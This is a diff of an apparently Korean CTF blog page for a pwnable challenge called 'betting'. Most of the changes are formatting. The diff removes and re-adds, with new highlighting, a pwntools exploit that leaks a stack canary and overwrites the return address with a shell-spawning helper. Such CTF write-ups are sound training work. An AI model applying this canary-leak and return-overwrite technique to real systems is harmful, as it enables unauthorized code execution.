@@ -64,7 +64,7 @@
     
 
 
-</head>
+<link rel="stylesheet" href="/css/prism.css" type="text/css"></head>
 </html>
 <body>
     <div id="wrap">
@@ -90,7 +90,7 @@
                                         <ul class="main-nav-list"><li class="main-nav-list-item"><a class="main-nav-list-link" href="/categories/Daily/">Daily</a></li><li class="main-nav-list-item"><a class="main-nav-list-link" href="/categories/Theory/">Theory</a></li><li class="main-nav-list-item"><a class="main-nav-list-link" href="/categories/WriteUps/">WriteUps</a><ul class="main-nav-list-child"><li class="main-nav-list-item"><a class="main-nav-list-link" href="/categories/WriteUps/Crypto/">Crypto</a></li><li class="main-nav-list-item"><a class="main-nav-list-link" href="/categories/WriteUps/Foren/">Foren</a></li><li class="main-nav-list-item"><a class="main-nav-list-link" href="/categories/WriteUps/Misc/">Misc</a></li><li class="main-nav-list-item"><a class="main-nav-list-link" href="/categories/WriteUps/Pwn/">Pwn</a></li><li class="main-nav-list-item"><a class="main-nav-list-link" href="/categories/WriteUps/Script/">Script</a></li><li class="main-nav-list-item"><a class="main-nav-list-link" href="/categories/WriteUps/Web/">Web</a></li></ul></li></ul>
                                     
                                 <li class="main-nav-list-item">
-                                    <a class="main-nav-list-link" href="https://about.me/j0n9hyun">About</a>
+                                    <a class="main-nav-list-link" href="/about">About</a>
                                 </li>
                             
                         </ul>
@@ -182,7 +182,7 @@
         <a class="tag-link" href="/tags/CTF/">CTF</a>
     </div>
 
-  			<span class="reading-time">⏱ 2 분</span>
+  			<span class="reading-time">⏱ 1 분</span>
             </div>
         
         
@@ -198,7 +198,32 @@ Canary가 걸려있으므로 Canary Leak을 해줘야 한다 우선 프로그램
 <img class="border-shadow" src="https://user-images.githubusercontent.com/16969364/58035935-d9a62080-7b64-11e9-9c42-97bdfea0f6f7.PNG">
 <center><small>[사진 1-3]</small></center>
 함수를 하나하나 훑어보면 shell 실행 함수가 떡하니 나와있다. 앞에 padding을 하고 마지막에 오는 ret 주소 부분에 이 helper 함수를 넣어주면 될 것이다.
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">r = process(<span class="string">'./betting'</span>)</span><br><span class="line">helper = <span class="number">0x4008F6</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">canary</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">global</span> canary</span><br><span class="line">    r.sendlineafter(<span class="string">"? "</span>, <span class="string">"A"</span>*<span class="number">24</span>)</span><br><span class="line">    r.sendlineafter(<span class="string">"? "</span>, <span class="string">"2"</span>)</span><br><span class="line">    r.recvuntil(<span class="string">"A"</span>*<span class="number">24</span> + <span class="string">"\n"</span>)</span><br><span class="line">    canary = u64(<span class="string">"\x00"</span> + r.recv()[:<span class="number">7</span>])</span><br><span class="line">    r.sendlineafter(<span class="string">"? "</span>, <span class="string">"2"</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exploit</span><span class="params">()</span>:</span></span><br><span class="line">    payload = <span class="string">""</span></span><br><span class="line">    payload += <span class="string">"A"</span>*<span class="number">40</span></span><br><span class="line">    payload += p64(canary)</span><br><span class="line">    payload += <span class="string">"A"</span>*<span class="number">8</span></span><br><span class="line">    payload += p64(helper)</span><br><span class="line">    r.sendline(payload)</span><br><span class="line">    r.interactive()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    canary()</span><br><span class="line">    exploit()</span><br></pre></td></tr></table></figure>
+<pre class="highlight"><code class="python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *
+
+r = process(<span class="hljs-string">'./betting'</span>)
+helper = <span class="hljs-number">0x4008F6</span>
+
+<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">canary</span><span class="hljs-params">()</span>:</span>
+    <span class="hljs-keyword">global</span> canary
+    r.sendlineafter(<span class="hljs-string">"? "</span>, <span class="hljs-string">"A"</span>*<span class="hljs-number">24</span>)
+    r.sendlineafter(<span class="hljs-string">"? "</span>, <span class="hljs-string">"2"</span>)
+    r.recvuntil(<span class="hljs-string">"A"</span>*<span class="hljs-number">24</span> + <span class="hljs-string">"\n"</span>)
+    canary = u64(<span class="hljs-string">"\x00"</span> + r.recv()[:<span class="hljs-number">7</span>])
+    r.sendlineafter(<span class="hljs-string">"? "</span>, <span class="hljs-string">"2"</span>)
+
+<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">exploit</span><span class="hljs-params">()</span>:</span>
+    payload = <span class="hljs-string">""</span>
+    payload += <span class="hljs-string">"A"</span>*<span class="hljs-number">40</span>
+    payload += p64(canary)
+    payload += <span class="hljs-string">"A"</span>*<span class="hljs-number">8</span>
+    payload += p64(helper)
+    r.sendline(payload)
+    r.interactive()
+
+<span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">"__main__"</span>:
+    canary()
+    exploit()
+</code></pre>
 <center><small>[Exploit Code]</small></center>
 <style>
   img.border-shadow{
@@ -213,7 +238,7 @@ Canary가 걸려있으므로 Canary Leak을 해줘야 한다 우선 프로그램
 
 
 
-    <a data-url="http://j0n9hyun.github.io/2019/02/19/betting/" data-id="cjzsg5bzq001rwnfpcsziv2fq" class="article-share-link"><i class="fa fa-share"></i>공유하기</a>
+    <a data-url="http://j0n9hyun.github.io/2019/02/19/betting/" data-id="ck00o3nr40026z7fp6ln7djl9" class="article-share-link"><i class="fa fa-share"></i>공유하기</a>
 <script>
     (function ($) {
         $('body').on('click', function() {
@@ -302,7 +327,7 @@ Canary가 걸려있으므로 Canary Leak을 해줘야 한다 우선 프로그램
 
 [사진 1-3]
 함수를 하나하나 훑어보면 shell 실행 함수가 떡하니 나와있다. 앞에 padding을 하고 마지막에 오는 ret 주소 부분에 이 helper 함수를 넣어주면 될 것이다."
-        "wordCount": 266
+        "wordCount": 214
     }
 </script>
 
@@ -415,6 +440,8 @@ Canary가 걸려있으므로 Canary Leak을 해줘야 한다 우선 프로그램
     </div>
 
 
+            
+                
             
                 
     <div class="widget-wrap widget-list">
